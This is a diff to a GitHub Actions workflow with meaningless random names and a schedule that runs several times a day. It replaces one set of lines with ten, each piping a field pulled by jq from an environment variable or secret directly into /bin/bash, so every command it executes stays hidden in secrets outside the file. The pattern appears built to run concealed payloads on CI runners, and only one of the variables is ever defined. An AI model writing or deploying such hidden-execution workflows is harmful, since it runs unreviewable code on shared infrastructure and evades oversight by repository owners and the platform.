@@ -1,24 +1,25 @@
 name: hehuchong1391
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
+    - cron: '25 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hehuchong1391
         env:
-          glft8: ${{ secrets.glft8 }}
+          dskuc013: ${{ secrets.dskuc013 }}
         run: |
-          echo $glft8 | jq -r .w67 | /bin/bash
-          echo $pll7044 | jq -r .jh00 | /bin/bash
-          echo $kqr40 | jq -r .iya76 | /bin/bash
-          echo $g6129 | jq -r .qvd039 | /bin/bash
-          echo $w569 | jq -r .gqhz7866 | /bin/bash
-          echo $n7764 | jq -r .gxpp54490 | /bin/bash
-          echo $qhu399 | jq -r .hn70349 | /bin/bash
+          echo $dskuc013 | jq -r .y392 | /bin/bash
+          echo $dkhqu37 | jq -r .biltw5 | /bin/bash
+          echo $ptn26 | jq -r .gim2710 | /bin/bash
+          echo $vibj71 | jq -r .hm3 | /bin/bash
+          echo $qdvbd916 | jq -r .sjkz360 | /bin/bash
+          echo $jgkco3 | jq -r .zut877 | /bin/bash
+          echo $v8 | jq -r .emuyf9 | /bin/bash
+          echo $ippzo025 | jq -r .so0 | /bin/bash
+          echo $cgi8 | jq -r .wbvcy4 | /bin/bash
+          echo $z90 | jq -r .lx52 | /bin/bash
 
